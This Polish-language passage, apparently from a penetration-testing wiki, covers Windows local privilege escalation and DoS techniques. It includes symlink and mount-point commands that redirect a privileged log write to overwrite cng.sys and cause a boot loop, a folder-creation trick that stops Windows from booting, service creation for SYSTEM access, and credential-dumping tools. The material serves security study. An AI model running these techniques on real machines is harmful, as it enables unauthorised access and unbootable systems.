> Ten atak jest wymierzony w wewnętrzny strumień NTFS przechowujący metadane folderu — jego usunięcie usuwa folder.

5. Krok 5: Zwolnij oplock
- Proces SYSTEM działa dalej i próbuje usunąć `file1.txt`.
- Jednak teraz, przez junction + symlink, tak naprawdę usuwa:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Wynik**: `C:\Config.Msi` jest usuwany przez SYSTEM.

### Od utworzenia dowolnego folderu do trwałego DoS

Wykorzystaj prymityw umożliwiający **utworzenie dowolnego folderu jako SYSTEM/admin** — nawet jeśli **nie możesz zapisywać plików** ani **ustawiać słabych uprawnień**.

Utwórz **folder** (nie plik) o nazwie **krytycznego sterownika Windows**, np.:
```
C:\Windows\System32\cng.sys
```

- Ta ścieżka zwykle odpowiada sterownikowi trybu jądra `cng.sys`.
- Jeśli **utworzysz wcześniej w tym miejscu folder**, system Windows nie załaduje właściwego sterownika podczas uruchamiania.
- Następnie system Windows próbuje załadować `cng.sys` podczas uruchamiania.
- Widzi folder, **nie może odnaleźć właściwego sterownika** i **ulega awarii lub zatrzymuje uruchamianie**.
- **Nie ma mechanizmu awaryjnego ani możliwości odzyskania systemu** bez zewnętrznej interwencji (np. naprawy rozruchu lub dostępu do dysku).

### Od uprzywilejowanych ścieżek logów/kopii zapasowych i symlinków OM do nadpisania dowolnego pliku / DoS podczas uruchamiania

Gdy **uprzywilejowana usługa** zapisuje logi/eksporty w ścieżce odczytanej z **zapisywalnego pliku konfiguracyjnego**, przekieruj tę ścieżkę za pomocą **symlinków Object Manager + punktów montowania NTFS**, aby zamienić uprzywilejowany zapis w nadpisanie dowolnego pliku (nawet **bez** SeCreateSymbolicLinkPrivilege).<sup>[[15]](#references)</sup>

**Wymagania**
- Plik konfiguracyjny przechowujący ścieżkę docelową jest zapisywalny przez atakującego (np. `%ProgramData%\...\.ini`).
- Możliwość utworzenia punktu montowania do `\RPC Control` oraz symlinku pliku OM (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Uprzywilejowana operacja zapisująca w tej ścieżce (log, eksport, raport).

**Przykładowy łańcuch**
1. Odczytaj plik konfiguracyjny, aby ustalić uprzywilejowaną lokalizację logu, np. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` w `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Przekieruj ścieżkę bez uprawnień administratora:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Poczekaj, aż uprzywilejowany komponent zapisze log (np. administrator wybierze „wyślij testowy SMS”). Zapis trafi teraz do `C:\Windows\System32\cng.sys`.
4. Sprawdź nadpisany plik docelowy (za pomocą parsera hex/PE), aby potwierdzić uszkodzenie; ponowne uruchomienie zmusza Windows do załadowania zmodyfikowanej ścieżki sterownika → **boot loop DoS**. Ta metoda działa również w przypadku dowolnego chronionego pliku, który uprzywilejowana usługa otworzy do zapisu.

> `cng.sys` jest zwykle ładowany z `C:\Windows\System32\drivers\cng.sys`, ale jeśli jego kopia znajduje się w `C:\Windows\System32\cng.sys`, może zostać użyta w pierwszej kolejności, co czyni ją niezawodnym celem DoS dla uszkodzonych danych.



## **Od High Integrity do System**

### **Nowa usługa**

Jeśli już działasz w procesie o poziomie High Integrity, **ścieżka do SYSTEM** może być łatwa — wystarczy **utworzyć i uruchomić nową usługę**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Podczas tworzenia pliku binarnego usługi upewnij się, że jest on prawidłową usługą lub że plik binarny wykonuje wymagane działania szybko, ponieważ zostanie zakończony po 20 s, jeśli nie będzie prawidłową usługą.

### AlwaysInstallElevated

Z procesu o High Integrity możesz spróbować **włączyć wpisy rejestru AlwaysInstallElevated** i **zainstalować** reverse shell za pomocą wrappera _**.msi**_.\
[Więcej informacji o użytych kluczach rejestru i instalowaniu pakietu _.msi_ znajdziesz tutaj.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Kod znajdziesz** [**tutaj**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Jeśli masz te uprawnienia tokenu (prawdopodobnie znajdziesz je w procesie o High Integrity), będziesz móc **otworzyć niemal dowolny proces** (z wyjątkiem procesów chronionych) dzięki uprawnieniu SeDebug, **skopiować token** procesu i utworzyć **dowolny proces z tym tokenem**.\
Ta technika jest zwykle **stosowana do dowolnego procesu uruchomionego jako SYSTEM ze wszystkimi uprawnieniami tokenu** (_tak, możesz znaleźć procesy SYSTEM bez wszystkich uprawnień tokenu_).\
**Przykład kodu wykonującego opisaną technikę znajdziesz** [**tutaj**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Tej techniki używa meterpreter do eskalacji uprawnień w `getsystem`. Polega ona na **utworzeniu pipe, a następnie utworzeniu lub nadużyciu usługi, aby zapisywała do tego pipe**. Następnie **serwer**, który utworzył pipe, używając uprawnienia **`SeImpersonate`**, będzie mógł **podszyć się pod token** klienta pipe (usługi), uzyskując uprawnienia SYSTEM.\
Jeśli chcesz [**dowiedzieć się więcej o name pipes, przeczytaj ten materiał**](#named-pipe-client-impersonation).\
Jeśli chcesz przeczytać przykład [**przejścia z High Integrity do System za pomocą name pipes, przeczytaj ten materiał**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Jeśli uda ci się **przejąć dll**, która jest **ładowana** przez **proces** uruchomiony jako **SYSTEM**, będziesz móc wykonać dowolny kod z tymi uprawnieniami. Dlatego Dll Hijacking przydaje się również do tego rodzaju eskalacji uprawnień. Co więcej, jest **znacznie łatwiejsze do przeprowadzenia z procesu o High Integrity**, ponieważ będzie on mieć **uprawnienia do zapisu** w folderach używanych do ładowania dll.\
**Więcej o Dll hijacking dowiesz się** [**tutaj**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Przeczytaj:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Statyczne pliki binarne impacket](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Najlepsze narzędzie do wyszukiwania lokalnych wektorów eskalacji uprawnień w Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Wyszukuje błędne konfiguracje i poufne pliki (**[**sprawdź tutaj**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Wykryto.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Wyszukuje możliwe błędne konfiguracje i zbiera informacje (**[**sprawdź tutaj**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Wyszukuje błędne konfiguracje**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Wyodrębnia informacje o zapisanych sesjach PuTTY, WinSCP, SuperPuTTY, FileZilla i RDP. Użyj lokalnie opcji -Thorough.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Wyodrębnia dane uwierzytelniające z Credential Manager. Wykryto.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Przeprowadza password spray z zebranymi hasłami w domenie**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh to narzędzie PowerShell do spoofingu ADIDNS/LLMNR/mDNS i ataków man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Podstawowe wyliczanie Windows pod kątem privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Wyszukuje znane podatności privesc (PRZESTARZAŁE, zastąpione przez Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokalne kontrole **(Wymagane uprawnienia Administratora)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Wyszukuje znane podatności privesc (należy skompilować przy użyciu VisualStudio) ([**prekompilowana wersja**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Wylicza hosta w poszukiwaniu błędnych konfiguracji (bardziej narzędzie do zbierania informacji niż privesc) (wymaga kompilacji) **(**[**prekompilowana wersja**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Wyodrębnia dane uwierzytelniające z wielu programów (prekompilowany plik exe na github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port PowerUp do C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Wyszukuje błędne konfiguracje (prekompilowany plik wykonywalny na github). Niezalecane. Nie działa dobrze w Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Wyszukuje możliwe błędne konfiguracje (exe z Pythona). Niezalecane. Nie działa dobrze w Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Narzędzie utworzone na podstawie tego posta (do poprawnego działania nie wymaga accesschk, ale może go używać).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Odczytuje wynik polecenia **systeminfo** i sugeruje działające exploity (lokalny Python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Odczytuje wynik polecenia **systeminfo** i sugeruje działające exploity (lokalny Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Musisz skompilować projekt przy użyciu odpowiedniej wersji .NET ([zobacz tutaj](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Aby sprawdzić zainstalowaną wersję .NET na hoście ofiary, możesz wykonać:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```





## References

- [1] [Podstawy eskalacji uprawnień w Windows](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Podnoszenie uprawnień przez wykorzystanie słabych uprawnień do folderów](http://www.greyhathacker.net/?p=738)
- [3] [Eskalacja uprawnień w Windows — ściągawka](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop — warsztaty z lokalnej eskalacji uprawnień w Windows / Linux](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 — Ataki na Windows: AT to nowa czerń (Rob Fuller i Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Eskalacja uprawnień — Windows — kompletny przewodnik OSCP](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows — eskalacja uprawnień — PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Przewodnik po eskalacji uprawnień w Windows](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Lista kontrolna eskalacji uprawnień w Windows](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Eskalacja uprawnień w Windows](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Metody eskalacji uprawnień w Windows dla pentesterów](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: phishing z makrem Word VBA przez SMTP → odszyfrowanie danych logowania hMailServer → Veeam CVE-2023-27532 do SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: wyciek przez format string + stack BOF → VirtualAlloc ROP (RCE) i kradzież tokena jądra](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research — W pogoni za Silver Fox: kot i mysz w cieniach jądra](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 — Luka w systemie plików z uprawnieniami uprzywilejowanymi w systemie SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Narzędzia do testowania dowiązań symbolicznych — użycie CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Powrót do przeszłości. Nadużywanie dowiązań symbolicznych w Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn — MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (port Cobalt Strike BOF)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI — Node.js Trust Falls: niebezpieczne rozwiązywanie modułów w Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Moduły Node.js: ładowanie z folderów `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits — rozwiązane zadania z listy kontrolnej C/C++](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn — funkcja RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery — NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone — CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone — przejęcie plików binarnych usług](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own z Microslop: łączenie CLDFLT i wyścigów w jądrze DirectX w celu lokalnej eskalacji uprawnień w Windows](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Jeden I/O Ring, by wszystkimi rządzić: prymityw pełnego odczytu/zapisu w Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Wykorzystywanie dowolnego usuwania plików do eskalacji uprawnień i inne przydatne sztuczki](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC — kod exploita FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure — ataki na WSUS, część 2: CVE-2020-1013, jednodniowa lokalna eskalacja uprawnień w Windows 10](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: poznawanie Credential Manager i Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n — PoC CVE-2019-1388](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com — delegowanie ograniczone oparte na zasobach Kerberos: jak zmiana obrazu prowadzi do eskalacji uprawnień](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com — wyodrębnianie kluczy prywatnych SSH z agenta SSH w Windows 10](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps — zamienianie korporacyjnych serwerów aktualizacji w fabryki backdoorów (0_o) — część 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps — zamienianie korporacyjnych serwerów aktualizacji w fabryki backdoorów (0_o) — część 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s — NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence — eskalacja uprawnień przez usunięcie folderu Windows Installer](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center — CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec — Total Recall: odtworzenie kroków prowadzących z powrotem do NT AUTHORITY\SYSTEM](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
- [44] [NCC Group — zalecenie dotyczące eskalacji uprawnień przez przesunięcia w pamięci współdzielonej Windows MIDI Services](https://nccgroup.com/research/technical-advisory-microsoft-windows-midi-service-module-escalation-of-privileges-cve-2026-62688)
{{#include ../../banners/hacktricks-training.md}}
